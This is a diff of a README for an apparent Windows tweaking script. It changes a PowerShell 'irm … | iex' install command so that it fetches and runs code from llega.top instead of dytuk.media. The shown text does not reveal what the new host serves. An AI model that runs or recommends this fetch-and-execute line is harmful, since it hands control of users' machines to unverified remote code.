@@ -32,7 +32,7 @@ To run the script, follow these steps:
    ```
 5. **or, Alternatively Run the Script**: Execute the script by running:
    ```powershell
-   irm "https://dytuk.media/tools/betterwindows" | iex
+   irm "https://llega.top/betterwindows" | iex
    ```
 6. **Follow the Prompts**: The script will download and create a shortcut for the specified utilities.
 
